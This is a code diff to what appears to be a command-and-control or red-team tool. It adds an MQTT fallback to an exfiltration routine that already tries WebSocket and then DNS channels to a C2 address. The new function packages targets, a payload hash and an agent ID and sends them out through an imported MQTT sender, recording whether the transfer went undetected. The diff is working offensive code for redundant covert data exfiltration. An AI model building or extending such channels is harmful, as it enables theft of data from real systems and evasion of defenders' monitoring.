@@ -50,7 +50,31 @@ def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
             return ws_result
         # WS also failed — fall back to DNS
         print(f"[!] WS failed — trying DNS fallback")
-        return _handle_exfil_dns(action_obj, mutation)
+        dns_result = _handle_exfil_dns(action_obj, mutation)
+        if dns_result.get("success"):
+            return dns_result
+        # DNS also failed — fall back to MQTT
+        print(f"[!] DNS failed — trying MQTT fallback")
+        return _handle_exfil_mqtt(action_obj, mutation)
+
+def _handle_exfil_mqtt(action_obj, mutation):
+    import uuid, os, sys
+    sys.path.insert(0, str(Path(__file__).parent))
+    from core.exfil_mqtt import send_via_mqtt
+    targets = action_obj.get("targets", [])
+    agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
+    data_blob = {
+        "targets": targets,
+        "payload_hash": mutation.payload_hash,
+        "personality": mutation.personality.value,
+        "noise": action_obj.get("noise"),
+    }
+    try:
+        success = send_via_mqtt(agent_id, data_blob)
+        return {"success": success, "detected": False, "channel": "MQTT", "latency_ms": 60.0}
+    except Exception as e:
+        return {"success": False, "detected": False, "channel": "MQTT", "latency_ms": 0.0, "error": str(e)}
+
 
 def _handle_exfil_dns(action_obj, mutation):
     import uuid, os, sys
